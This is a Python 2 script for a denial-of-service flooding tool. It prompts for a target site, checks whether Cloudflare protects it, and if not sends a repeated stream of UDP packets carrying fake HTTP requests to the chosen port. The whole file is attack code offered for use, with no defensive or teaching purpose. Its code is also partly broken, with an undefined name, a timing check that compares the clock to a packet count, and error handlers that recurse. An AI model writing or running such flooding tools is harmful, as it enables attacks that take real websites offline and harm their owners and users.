import socket, urllib, requests, time
from colored import fg, bg, attr


def attack(url, ports, packets):
   try:

   # Preparing For Flood

     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     ltarget = socket.gethostbyname(url)
     port = ports
     byte = packets
     u = open("user-agents.txt","r");
     user_agents = u.readline()
     pack = str("GET / HTTP/1.1\nHost:{}\n\n User-Agent:{}\n{}".format(ltarget, user_agents, byte))
     sock.sendto(pack, (ltarget, port))
     print ("attacking : %s%s| %s | %s | %s |" % (fg('black'), bg('red'), ltarget, port, attr(0)))

  # Exceptions

   except socket.error as (msg):
     print ("\033[31m[Error] \033[33mconnection lost") + "\033[0m"
     time.sleep(1.5)
     start()
   except socket.gaierror as (msg):
     print ("\033[31m[Error] \033[33merror connecting to socket") + "\033[0m"
     time.sleep(1.5)
     start()
   except KeyboardInterrupt:
     print ("\033[31m[Error] \033[33m keyboard interrupt by user") + "\033[0m"
     time.sleep(1.5)
     start()



def scan(url, packets):

   # Getting Port

     lport = raw_input("\n  %s%sDo you want to use port 80? [ y / n ]%s > " % (fg('black'), bg(160), attr(0)))
     if lport == 'y' or lport == 'Y':
        port = 80
        strt = raw_input("\n  %s%sDo you want to start flooding? [ Y / n ]%s > " % (fg('black'), bg(160), attr(0)))
        if strt == 'y' or strt == Y:
           while 1:
              if time.time() > packets:
                 break
              else:
                 attack(url, port, packets)
        elif strt == 'n' or strt == 'N':
           print ""
       
     elif lport == 'n' or lport == 'N':
        prt = raw_input("  %s%sEnter your Port%s > " % (fg('black'), bg(160), attr(0)))
        port = "{}".format(prt)
        strt = raw_input("\n  %s%sDo you want to start flooding? [ Y / n ]%s > " % (fg('black'), bg(160), attr(0)))
        if strt == 'y' or strt == 'Y':
           while 1:
              if time.time() > packets:
                 break
              else:
                 attack(url, port, packets)
        elif strt == 'n' or strt == 'N':
           print ""

   # Exceptions


def start():
   try:

   # Start Output Start Here

     print ("\nEnter Target [ www.target.com / target.com ] \n")
     lulz = raw_input("  %s%sTarget Host%s > " % (fg('black'), bg(160), attr(0)))
     if lulz == 'main':
       print ""
     else:
       pack = raw_input("\n  %s%spackets%s > " % (fg('black'), bg(160), attr(0)))

   # Cloudflare!

       time.sleep(1.5)
       print ("\n\033[32m[+]\033[0m Detecting Cloudflare Before Attacking!")
       data = "http://"+lulz #+'/'
       url = urllib.urlopen(data)
       sourcecode = url.read()
       if "used CloudFlare to restrict access</title>" in sourcecode:
             print("\n\033[31m  [ Cloudflare Detected ]")
             print("\033[37m  [status] : %s%scloudflare blocked the ip%s" % (fg('blacl'), bg(160), attr(0)))
       else:
             print("\n\033[32m  [ No Cloudflare Detected ]")
             print("\033[32m  [status] : %s%sGood%s" % (fg('black'), bg('green'), attr(0)))
             scan(lulz, pack)

   # Exceptions

   except IOError:
       print ("\033[31m[Error] \033[33merror connecting to site") + "\033[0m"
